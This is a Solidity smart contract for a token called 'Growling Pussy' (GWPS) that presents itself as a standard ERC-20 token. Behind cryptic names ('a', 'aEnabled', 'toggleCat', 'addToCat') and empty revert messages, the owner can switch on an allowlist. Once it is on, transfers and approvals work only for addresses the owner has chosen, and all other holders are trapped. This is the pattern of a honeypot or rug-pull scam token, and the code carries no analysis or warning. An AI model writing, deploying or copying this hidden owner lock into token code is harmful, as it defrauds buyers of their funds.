// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.2;

contract Token {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public a;
    bool public aEnabled = false;
    address public owner;
    uint256 public totalSupply = 1000000000000;
    string public name = "Growling Pussy";
    string public symbol = "GWPS";
    uint256 public decimals = 0;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor() { 
        balances[msg.sender] = totalSupply;
        owner = msg.sender;
        a[owner] = true;
    }
    
    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(balances[msg.sender] >= value, "balance too low");
        require((!aEnabled) || (a[msg.sender] && a[to]), "");
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(balances[from] >= value, "balance too low");
        require(allowance[from][msg.sender] >= value, "allowance too low");
        require((!aEnabled) || (a[msg.sender] && a[from] && a[to]), "");
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint256 value) public returns (bool) {
        require((!aEnabled) || (a[msg.sender] && a[spender]), "");
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
        
    function addToCat(address[] memory accounts) public {
        require(msg.sender == owner, "");
        for (uint i = 0; i < accounts.length; i++) {
            a[accounts[i]] = true;
        }
    }

    function removeFromCat(address[] memory accounts) public {
        require(msg.sender == owner, "");
        for (uint i = 0; i < accounts.length; i++) {
            a[accounts[i]] = false;
        }
    }


    function toggleCat() public {
        require(msg.sender == owner, "");
        aEnabled = !aEnabled;
    }
}